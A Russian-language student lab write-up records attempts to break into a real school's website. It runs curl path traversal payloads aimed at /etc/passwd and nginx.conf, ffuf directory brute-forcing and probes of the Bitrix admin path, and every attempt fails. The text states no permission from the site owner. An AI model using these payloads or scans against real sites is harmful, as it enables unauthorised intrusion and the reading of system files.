# Лабораторная работа 1 со звездочкой
Для попытки взлома был выбран сайт школы 207 https://207school.spb.ru/

## Подготовка окружения

Лабораторная выполнена на виртуальной машине, на Ubuntu (64-bit)

Обновляем систему, устанавливаем инструмент ffuf для перебора веб-страниц и curl с wget для выполнения HTTP-запросов к целевому веб-серверу и проверки его ответов при тестировании уязвимостей

```
sudo apt update && sudo apt upgrade -y
sudo apt install ffuf curl wget -y
```

Проверим доступность сайта:

```curl -I http://207school.spb.ru```

<img width="1080" height="402" alt="image" src="https://github.com/user-attachments/assets/0f504bc8-e7b1-43af-baf2-6286622b67bb" />

## Проверка уязвимости Path Traversal

Сначала попробуем получить доступ к системным файлам

### Базовый path traversal:

```
curl "http://school207.ru/../../../etc/passwd"
curl "http://school207.ru/../../../../etc/passwd"
```
<img width="1212" height="688" alt="image" src="https://github.com/user-attachments/assets/ac8b5a64-06b7-4b63-82eb-af8c62f448f9" />

<img width="1220" height="662" alt="image" src="https://github.com/user-attachments/assets/133b52d3-3d78-436c-ace7-ec7b3ad4694b" />

Возвращает html главной страницы 

### URL encoding:

```
curl "http://school207.ru/..%2f..%2f..%2fetc%2fpasswd"
curl "http://school207.ru/%2e%2e/%2e%2e/etc/passwd"
```
<img width="878" height="222" alt="image" src="https://github.com/user-attachments/assets/11f6f2d4-cf12-4b35-9991-bf6b4699e754" />

<img width="888" height="182" alt="image" src="https://github.com/user-attachments/assets/86bbc572-5b54-41d0-a0d5-9f6284215990" />

Блокирует запрос :((

### Через параметры:

```
curl "http://school207.ru/?file=../../../etc/passwd"
curl "http://school207.ru/download?file=../../etc/passwd"
```
<img width="1216" height="684" alt="image" src="https://github.com/user-attachments/assets/1cb04706-b512-4b0e-9664-da3584758129" />
<img width="1204" height="712" alt="image" src="https://github.com/user-attachments/assets/618b0a9a-3e91-4aa0-9113-fef6833d8784" />

Возвращает html главной страницы 

### Проверка конфигурационных файлов nginx:

```
curl "http://school207.ru/../nginx.conf"
curl "http://school207.ru/../../nginx/nginx.conf"
```

<img width="1212" height="710" alt="image" src="https://github.com/user-attachments/assets/271e0c6f-59a1-4c65-92c0-b9cf67ed3fb7" />
<img width="1204" height="632" alt="image" src="https://github.com/user-attachments/assets/93d662f6-5b99-4b91-9b96-c91ab01d5a3d" />

Возвращает html главной страницы 

### Оценка результатов:

1. Все способы кроме URL-encoding возвращают главную страницу сайта, что значит что Nginx нормализует путь и игнорирует ../. Вместо попытки выйти из корневой директории, он просто показывает главную страницу (/). Это нормальное поведение правильно настроенного nginx.
  
2. URL-encoding возвращает 400 Bad Request, что значит что Nginx распознал это как попытку path traversal и заблокировал запрос. Код 400 означает "неверный запрос", то есть защита работает.

Тем не менее попытаемся найти еще что-нибудь.

## Проверка уязвимости перебора страниц через ffuf


```sudo apt install git -y``` - установим гит

```git clone https://github.com/danielmiessler/SecLists.git``` - скачаем популярную коллекцию вордлистов

Посмотрим что скачалось:

```
cd SecLists/Discovery/Web-Content/
ls -la
```

<img width="1076" height="706" alt="image" src="https://github.com/user-attachments/assets/5a493fed-14e5-456a-97fd-bacefe160e34" />

```ffuf -w SecLists/Discovery/Web-Content/common.txt -u http://school207.ru/FUZZ -mc 200,301,302,403 -t 50``` - перебор с помощью вордлиста

Результат:

<img width="972" height="708" alt="image" src="https://github.com/user-attachments/assets/e3b50d72-8b0a-4e59-bfae-67d772461855" />

<img width="986" height="200" alt="image" src="https://github.com/user-attachments/assets/743bd5d8-0d7d-4610-975e-d02f7c3dcb3d" />

Заблокаированные (403):

Все ```.git/``` защищены от доступа, ```.htaccess```, ```.htpasswd``` - конфиги защищены, ```.svn/``` - SVN репозитории защищены 

Интересные находки (код 301, успешно обнаруженные директории):

```.well-known/``` - стандартная директория для сертификатов

```upload/``` - директория для загрузки файлов

```documents/``` - возможное хранилище документов

```images/``` - директория с изображениями

```tmp/``` - временные файлы

```bitrix/``` - указывает на использование CMS Bitrix


## Проверка уязвимости раскрытия информации (information disclosure)

Проверим найденные директории подробнее:


```curl "http://school207.ru/upload/"```
<img width="1182" height="602" alt="image" src="https://github.com/user-attachments/assets/a6d4c81a-62c8-42a1-84d5-31ebb39c36b9" />


```curl "http://school207.ru/tmp/"```

<img width="1004" height="248" alt="image" src="https://github.com/user-attachments/assets/8dd20b8b-c223-4d89-be4b-0745529e3e78" />

```curl "http://school207.ru/bitrix/admin/"```

<img width="1036" height="238" alt="image" src="https://github.com/user-attachments/assets/3ab92ca6-4179-4ee1-be27-90750ea672b8" />


Попробуем ```curl -s -I "http://school207.ru/bitrix/"```

<img width="1134" height="216" alt="image" src="https://github.com/user-attachments/assets/ceb6b105-1a80-4ea0-a81f-9408bb237017" />

код 200, то есть он доступен!

Тогда посмотрим наполнение

```curl "http://school207.ru/bitrix/"```

<img width="1174" height="120" alt="image" src="https://github.com/user-attachments/assets/1959ca78-51f7-4cc3-8aa2-365c3cfda7cf" />

Из этого можем сделать вывод что при заходе на /bitrix/ происходит автоматическое перенаправление на админку, причем content="0" - перенаправление мгновенное (0 секунд), и нас перенаправляет на /bitrix/admin/index.php, то есть мы узнали точный путь к админке Bitrix и подтвердили её существование, хотя доступ к ней все еще запрещен :(( молодцы ребята все настроили защитили практически правильно.


